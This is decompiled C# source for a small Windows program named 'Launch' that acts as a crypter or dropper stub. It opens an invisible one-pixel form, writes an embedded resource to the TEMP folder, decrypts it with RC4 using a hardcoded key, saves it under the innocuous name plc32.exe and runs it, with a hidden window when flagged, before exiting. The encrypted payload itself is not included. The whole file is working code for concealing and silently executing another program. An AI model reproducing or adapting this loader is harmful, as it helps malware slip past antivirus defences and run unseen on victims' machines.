using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Launch;

internal class Form1 : Form
{
	private IContainer components;

	private bool hide;

	protected override void Dispose(bool disposing)
	{
		if (!disposing)
		{
		}
		if (components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1, 1));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1(string[] args)
	{
		InitializeComponent();
		((Control)this).set_Visible(false);
		extract();
		start(args);
	}

	public void RC4(ref byte[] bytes, byte[] key)
	{
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = key[i % key.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < bytes.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			bytes[j] ^= array[num2];
		}
	}

	private string buildargument(string[] args)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < args.Length; i++)
		{
			stringBuilder.Append(args[i] + " ");
		}
		return stringBuilder.ToString();
	}

	private void extract()
	{
		string text = Assembly.GetExecutingAssembly().GetManifestResourceNames()[0];
		hide = text.EndsWith("hideit.exe");
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text);
		BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
		FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\sysdx.exe", FileMode.Create);
		byte[] array = new byte[manifestResourceStream.Length];
		manifestResourceStream.Read(array, 0, array.Length);
		fileStream.Write(array, 0, array.Length);
		binaryReader.Close();
		fileStream.Close();
	}

	private void start(string[] args)
	{
		byte[] key = new byte[6] { 41, 16, 8, 43, 17, 1 };
		byte[] bytes = File.ReadAllBytes(Environment.GetEnvironmentVariable("TEMP") + "\\sysdx.exe");
		RC4(ref bytes, key);
		File.WriteAllBytes(Environment.GetEnvironmentVariable("TEMP") + "\\plc32.exe", bytes);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\plc32.exe";
		processStartInfo.Arguments = buildargument(args);
		processStartInfo.CreateNoWindow = hide;
		if (hide)
		{
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		}
		processStartInfo.WorkingDirectory = Application.get_StartupPath();
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Application.Exit();
	}
}
